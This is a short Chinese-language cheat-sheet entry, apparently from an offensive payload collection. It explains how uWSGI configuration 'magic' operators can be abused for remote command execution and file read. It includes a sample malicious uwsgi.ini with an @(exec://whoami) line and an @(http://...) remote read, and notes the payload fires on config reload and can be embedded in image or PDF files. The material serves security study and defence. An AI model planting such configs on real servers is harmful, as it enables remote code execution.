
     
# uWSGI 配置文件
UWSGI配置文件可以用语法定义的“魔术”变量、占位符和运算符。特别是‘@’运算符以@(文件名)的形式使用，以包含文件的内容。解析.ini配置文件时，这些运算符可以武器化作用于远程命令执行或任意文件写入/读取。

恶意uwsgi.ini文件示例：

```ini
[uwsgi]
; 从symbol中读取
foo = @(sym://uwsgi_funny_function)
; 从二进制追加数据中读取
bar = @(data://[REDACTED])
; 从http中读取
test = @(http://[REDACTED])
; 从文件描述符中读取
content = @(fd://[REDACTED])
; 从进程标准输出读取
body = @(exec://whoami)
; 调用返回字符的函数*
characters = @(call://uwsgi_func)
```

当解析配置文件时(例如，重新启动、崩溃或自动重新加载时)，将执行payload。

## uWSGI 解析问题

uWSGI配置文件存在解析不严问题。先前的payload可以嵌入二进制文件(例如，jpg、png、pdf等)。

## 致谢

* [A New Vector For “Dirty” Arbitrary File Write to RCE - Doyensec - Maxence Schmitt and Lorenzo Stella](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html)